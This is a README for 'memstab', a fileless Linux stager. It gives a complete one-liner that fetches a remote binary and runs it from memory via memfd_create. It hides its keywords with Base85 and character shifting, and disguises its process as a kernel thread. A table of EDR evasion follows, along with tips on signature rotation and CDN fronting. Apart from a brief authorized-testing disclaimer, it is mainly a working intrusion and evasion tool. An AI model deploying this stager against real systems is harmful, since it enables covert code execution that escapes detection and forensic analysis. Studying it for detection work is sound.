
# 👻 memstab: Ghost Zero-File Autonomous Stager

`memstab` executes binaries directly within system memory. It leverages Linux kernel's native capabilities and removes the need for any on-disk artifacts, with just a one-liner command useful as a process-injection tool.

⚠️ **Please Note:** This project is strictly for **Educational and Authorized Penetration Testing**. I am not responsible for any of the shenanigans you guys pull.

## 🛠️ PoC

The one-liner python obfuscation builder generates a stager. This stager performs a chain of events to transition from a shell command to a running process without ever touching the hard drive.

### 1. Why is it "Fileless"?
Standard execution involves the kernel reading a file from the filesystem. `memstab` uses the `memfd_create` system call. This creates an anonymous file that resides exclusively in **volatile RAM**.
*   **Hook**: We use `ctypes` to bridge Python to the C library (`libc.so.6`) and invoke syscall 319 (`memfd_create`).
*   **Evidence**: Even while the binary is running, an `ls` of the directory will show nothing. The only reference exists in `/proc/[PID]/fd/`, labeled as `memfd: (deleted)`.

### 2. LotL?
Yes. Though it involves using pre-installed system tools to perform unauthorized actions.
*   **Binaries Used**: `curl` and `python3`. These are ubiquitous in Linux environments, so their presence does not trigger "unusual software" alerts.
*   **Protocol**: It uses the standard Python interpreter to handle the logic, masquerading as a routine administrative task.

---

## 🔐 EDR Detection Features

`memstab` flies under the radar of EDR suites by targeting specific detection gaps.

| Sector | Detection Method | memstab |
| :--- | :--- | :--- |
| **Static Analysis** | Signature scanning of files on disk. | **Bypass**. No file exists on disk to be scanned. |
| **Heuristic Logic** | Monitoring for common strings like `curl`, `bash`. | **Obfuscated**. Base85 and Bit-Shifting hide all suspicious keywords. |
| **Behavioral** | Monitoring for new, unrecognized processes. | **Masquerading**. Uses `prctl` to rename the process to a fake kernel thread (`[kworker/u2:0]`). |
| **Forensic** | Post-incident analysis of deleted files. | **Volatile**. Once the process ends, the memory is wiped. There is no "deleted file" to recover. |

---

## 🚀 Execution Guide

### Remote Server
Host your target binary (e.g., `check_id`) on your delivery server.
```bash
python3 -m http.server 8080 --bind 127.0.0.1
```

### Payload Generation
Run this one-liner on your local machine to obfuscate the payload. Replace the URL with your server's IP.

```bash
python3 -c 'import base64; u="http://127.0.0.1:8080/check_id"; logic=f"""import os,ctypes,urllib.request,sys;r=urllib.request.urlopen(sys.argv[1]);p=r.read();l=ctypes.CDLL("libc.so.6");fd=l.syscall(319,b"",1);os.write(fd,p);l.prctl(15,b"[kworker/u2:0]",0,0,0);os.execve(f"/proc/self/fd/{{fd}}",["[init]"],{{}})"""; cmd=f"python3 -c \x27{logic}\x27 {u}"; enc=base64.b85encode("".join(chr(ord(c)+1) for c in cmd).encode()).decode(); print(f"\npython3 -c \x27import base64,os;d=base64.b85decode(\"{enc}\").decode();os.system(\"\".join(chr(ord(c)-1) for c in d))\x27")'
```

- If you want to store the one-liner as a python file, I have included a builder script in the repo. It's essentially the code-block version of this command.

### Deployment
Paste the output into the target terminal.

- **(Debug)** To prove the fileless state, run:
```bash
# verify if the binary is running in RAM
ps aux | grep init
# verify the file descriptor is anonymous
ls -l /proc/$(pidof [init])/exe
```

---

## 📈 Tweaks You Can Do

`memstab` can be moulded according to your engagement requirements.

*   **Entropy Rotation**: Change the bit-shift integer in the builder (e.g., from `+1` to `+5`) to make sure that even if one payload is analyzed, the next will have a completely different byte signature.
*   **Staging masquerade**: Change the process name in the builder (`[kworker/u2:0]`) to match common processes on the specific target machine (e.g., `[sshd]` or `[systemd]`).
*   **Network Obfuscation**: Use reputed URLs or CDN fronting for your delivery server to blend the `curl` traffic as normal noise.

---

<p align="center">
  With ❤️ by <b>Aradhya</b>
</p>
